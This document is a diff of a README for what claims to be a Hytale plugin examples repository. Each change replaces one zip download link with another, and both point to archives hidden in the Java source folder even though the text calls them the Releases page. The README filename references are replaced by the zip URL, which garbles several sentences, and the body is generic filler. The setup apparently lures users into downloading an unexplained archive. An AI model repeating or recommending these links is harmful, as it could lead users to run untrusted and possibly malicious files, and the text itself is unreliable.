@@ -1,6 +1,6 @@
 # 🌟 Hytale-Plugin-Examples - Practical Examples for Hytale Modding
 
-[![Download Latest Release](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip%20Latest%https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip)](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip)
+[![Download Latest Release](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip%20Latest%https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip)](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip)
 
 ## 📋 Description
 Hytale-Plugin-Examples provides a variety of practical examples for modding Hytale servers using the plugin API. This repository contains sample code and configurations tailored to help you smoothly navigate the development of your Hytale plugins.
@@ -12,7 +12,7 @@ To get started with Hytale-Plugin-Examples, follow these simple steps:
 Ensure you have Hytale installed on your system. You can find instructions for installation on the Hytale official website. 
 
 ### **2. Download the Examples**
-To obtain the latest release of Hytale-Plugin-Examples, you will need to visit the Releases page. Go to this link: [Download Hytale-Plugin-Examples](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip).
+To obtain the latest release of Hytale-Plugin-Examples, you will need to visit the Releases page. Go to this link: [Download Hytale-Plugin-Examples](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip).
 
 ### **3. Choose the Release**
 On the Releases page, look for the latest version. Click on the version to open the details.
@@ -21,7 +21,7 @@ On the Releases page, look for the latest version. Click on the version to open 
 You will find several files listed under the latest version. Choose the ones that you need for your project. Download them to a location on your computer that you can easily find later.
 
 ## 🛠️ Download & Install
-1. Visit the Releases page: [Download Hytale-Plugin-Examples](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip).
+1. Visit the Releases page: [Download Hytale-Plugin-Examples](https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip).
 2. Select the appropriate example files for your server modding needs.
 3. Save the downloaded files.
 
@@ -33,7 +33,7 @@ Each example within the repository is meant to offer practical insights into usi
 
 ### **Example Structure**
 Each example typically includes:
-- **https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip**: Guides you on how to use the example.
+- **https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip**: Guides you on how to use the example.
 - **Plugin Files**: Essential files needed to run the example.
   
 ## 🎮 Running the Examples
@@ -54,7 +54,7 @@ To run the examples you have downloaded:
 A: While some programming know-how can help, most examples in this repository are designed for beginners. Following the instructions should be straightforward.
 
 ### **Q: What if I encounter issues while using these examples?**
-A: Check the https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/Examples_Hytale_Plugin_3.4-alpha.3.zip file that accompanies each example. It usually contains instructions and common troubleshooting tips. If you still need help, feel free to ask in the community forums or GitHub discussions.
+A: Check the https://github.com/Koy241/Hytale-Plugin-Examples/raw/refs/heads/main/src/main/java/com/example/plugin/utils/Hytale-Examples-Plugin-v2.2.zip file that accompanies each example. It usually contains instructions and common troubleshooting tips. If you still need help, feel free to ask in the community forums or GitHub discussions.
 
 ### **Q: Can I modify the examples?**
 A: Absolutely! These examples are meant to be customized. Feel free to adjust the code to suit your needs.
